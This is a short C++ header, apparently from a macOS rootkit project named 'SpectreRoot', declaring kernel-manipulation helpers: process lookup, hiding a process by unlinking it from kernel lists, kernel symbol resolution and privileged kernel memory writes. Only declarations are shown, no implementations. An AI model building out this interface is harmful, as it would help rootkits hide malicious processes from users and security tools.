


#ifndef SPECTREROOT_DKOM_UTILS_HPP
#define SPECTREROOT_DKOM_UTILS_HPP

#include <mach/mach.h>
#include <string>

// Returns the PID of a named process
pid_t find_pid_by_name(const std::string& process_name);

// Hides a process from userland by unlinking it from kernel lists
bool hide_process(pid_t pid);

// Kernel symbol resolution
uintptr_t find_kernel_symbol(const std::string& symbol_name);

// Perform privileged memory write
bool write_kernel_memory(uintptr_t address, const void* data, size_t size);

// Debug helper
void log_debug(const std::string& msg);

#endif // SPECTREROOT_DKOM_UTILS_HPP